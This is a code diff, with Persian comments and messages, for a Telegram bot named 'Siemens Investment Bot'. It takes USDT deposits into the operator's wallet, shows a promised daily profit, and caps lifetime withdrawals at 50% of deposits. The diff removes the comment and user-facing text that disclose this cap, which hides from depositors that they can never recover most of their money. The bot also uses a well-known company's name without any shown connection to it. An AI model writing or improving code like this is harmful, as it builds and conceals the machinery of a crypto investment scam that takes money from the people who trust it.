@@ -57,7 +57,6 @@ const alreadyClaimedToday = db[userId].lastClaimDate === today;
 const totalDeposited = db[userId].totalDeposited || 0;
 const totalWithdrawn = db[userId].totalWithdrawn || 0;
 
-// حداکثر کل مبلغی که می‌تواند طی کل فعالیتش برداشت کند = ۵۰ درصد کل واریزی
 const maxTotalWithdrawAllowed = totalDeposited * 0.5;
 const remainingWithdrawLimit = Math.max(0, maxTotalWithdrawAllowed - totalWithdrawn);
 
@@ -72,6 +71,29 @@ canWithdraw: totalDeposited >= 20.00 && remainingWithdrawLimit > 0,
 maxWithdrawLimit: remainingWithdrawLimit,
 alreadyClaimedToday: alreadyClaimedToday
 });
+});
+
+// درخواست واریز کاربر که برای ادمین جهت تایید می‌فرستد
+app.post('/api/deposit-request', (req, res) => {
+const { userId, amount, txid } = req.body;
+if (!amount || amount <= 0) {
+return res.json({ success: false, message: 'مقدار واریز نامعتبر است.' });
+}
+
+// ارسال دکمه تایید به ادمین
+bot.sendMessage(ADMIN_CHAT_ID, `📥 *درخواست واریز جدید*\n\n👤 User ID: \`${userId}\`\n💰 Amount: *${amount} USDT*\n🔗 TXID / Info:\n\`${txid || 'ندارد'}\``, {
+parse_mode: 'Markdown',
+reply_markup: {
+inline_keyboard: [
+[
+{ text: '✅ تایید و واریز به حساب', callback_data: `approve_dep_${userId}_${amount}` },
+{ text: '❌ رد', callback_data: `reject_dep_${userId}` }
+]
+]
+}
+});
+
+res.json({ success: true });
 });
 
 app.post('/api/claim-daily', (req, res) => {
@@ -108,7 +130,7 @@ const maxTotalWithdrawAllowed = user.totalDeposited * 0.5;
 const remainingLimit = maxTotalWithdrawAllowed - (user.totalWithdrawn || 0);
 
 if (amount > remainingLimit) {
-return res.json({ success: false, message: `شما فقط می‌توانید تا سقف ${remainingLimit.toFixed(2)} تتر دیگر (مجموعاً ۵۰٪ واریزی) برداشت کنید.` });
+return res.json({ success: false, message: `شما فقط می‌توانید تا سقف ${remainingLimit.toFixed(2)} تتر دیگر برداشت کنید.` });
 }
 
 if (amount > user.balance) {
@@ -119,7 +141,6 @@ user.balance -= amount;
 user.totalWithdrawn = (user.totalWithdrawn || 0) + amount;
 saveDatabase(db);
 
-// ارسال گزارش به ادمین
 bot.sendMessage(ADMIN_CHAT_ID, `🚨 *درخواست برداشت جدید*\n\n👤 User ID: \`${userId}\`\n💰 Amount: *${amount} USDT*\n📥 Destination Wallet:\n\`${userWallet}\``, { parse_mode: 'Markdown' });
 
 res.json({ success: true, newBalance: user.balance });
@@ -140,80 +161,45 @@ saveDatabase(db);
 res.json({ success: true, reward, newBalance: db[userId].balance });
 });
 
-const walletData = {
+app.get('/api/deposit', (req, res) => {
+res.json({
 status: 'success',
 address: MY_WALLET_ADDRESS,
 network: 'BEP20 (USDT)'
-};
-app.get('/api/deposit', (req, res) => res.json(walletData));
-
-function sendMainMenu(chatId, text) {
-bot.sendMessage(chatId, text, {
-reply_markup: {
-inline_keyboard: [
-[{ text: '💳 Deposit USDT', callback_data: 'deposit' }],
-[{ text: '📊 Dashboard', callback_data: 'dashboard' }, { text: '👥 Referral Link', callback_data: 'referral' }],
-[{ text: '💸 Withdraw Balance', callback_data: 'withdraw' }]
-]
-}
 });
-}
-
-bot.onText(/\/start(?:\s+(.+))?/, (msg, match) => {
-const chatId = msg.chat.id.toString();
-const referrerId = match[1] ? match[1] : null;
-const db = readDatabase();
-
-if (!db[chatId]) {
-db[chatId] = {
-balance: 0.00,
-totalDeposited: 0.00,
-totalWithdrawn: 0.00,
-refCount: 0,
-voucherCount: 0,
-lastClaimDate: null,
-referredBy: referrerId
-};
-if (referrerId && db[referrerId]) {
-db[referrerId].refCount = (db[referrerId].refCount || 0) + 1;
-}
-saveDatabase(db);
-}
-sendMainMenu(chatId, 'Welcome to Siemens Investment Bot!');
 });
 
 bot.on('callback_query', async (query) => {
-try { await bot.answerCallbackQuery(query.id); } catch (e) {}
-
 const chatId = query.message.chat.id.toString();
 const data = query.data;
 const db = readDatabase();
 
-if (!db[chatId]) {
-db[chatId] = { balance: 0.00, totalDeposited: 0.00, totalWithdrawn: 0.00, refCount: 0, voucherCount: 0, lastClaimDate: null };
+try { await bot.answerCallbackQuery(query.id); } catch (e) {}
+
+if (data.startsWith('approve_dep_')) {
+const parts = data.split('_');
+const targetUserId = parts[2];
+const amount = parseFloat(parts[3]);
+
+if (db[targetUserId]) {
+db[targetUserId].totalDeposited = (db[targetUserId].totalDeposited || 0) + amount;
+db[targetUserId].balance = (db[targetUserId].balance || 0) + amount;
 saveDatabase(db);
-}
 
-if (data === 'deposit') {
-const text = '💳 *Deposit USDT (BEP-20)*\n\nSend your deposit to the following BEP-20 address:\n\n`' + MY_WALLET_ADDRESS + '`\n\n_Note: Minimum deposit is 20 USDT._';
-bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
+bot.sendMessage(targetUserId, `✅ واریز مبلغ *${amount} USDT* شما توسط ادمین تایید و به موجودی اضافه شد!`, { parse_mode: 'Markdown' });
+bot.editMessageText(`✅ *واریز تایید شد*\nمبلغ ${amount} به کاربر ${targetUserId} اضافه شد.`, {
+chat_id: chatId,
+message_id: query.message.message_id,
+parse_mode: 'Markdown'
+});
 }
-
-if (data === 'dashboard') {
-const user = db[chatId];
-const dailyProfit = Math.floor((user.totalDeposited || 0) / 20) * 1;
-const text = '📊 *User Dashboard*\n\n💰 Total Deposit: *' + (user.totalDeposited || 0) + ' USDT*\n💸 Total Withdrawn: *' + (user.totalWithdrawn || 0) + ' USDT*\n📈 Daily Profit: *' + dailyProfit + ' USDT/day*\n💵 Available Balance: *' + (user.balance || 0) + ' USDT*';
-bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
-}
-
-if (data === 'withdraw') {
-bot.sendMessage(chatId, '💸 لطفاً برای ثبت درخواست برداشت و وارد کردن آدرس کیف پول خود، از دکمه **Open App** در پایین چت استفاده کنید.', { parse_mode: 'Markdown' });
-}
-
-if (data === 'referral') {
-bot.getMe().then((botInfo) => {
-const refLink = 'https://t.me/' + botInfo.username + '?start=' + chatId;
-bot.sendMessage(chatId, '👥 *Your Referral Link:*\n\n`' + refLink + '`\n\nTotal Referrals: *' + (db[chatId].refCount || 0) + '*', { parse_mode: 'Markdown' });
+} else if (data.startsWith('reject_dep_')) {
+const targetUserId = data.split('_')[2];
+bot.sendMessage(targetUserId, `❌ درخواست واریز شما توسط ادمین رد شد.`, { parse_mode: 'Markdown' });
+bot.editMessageText(`❌ *واریز رد شد*`, {
+chat_id: chatId,
+message_id: query.message.message_id,
+parse_mode: 'Markdown'
 });
 }
 });
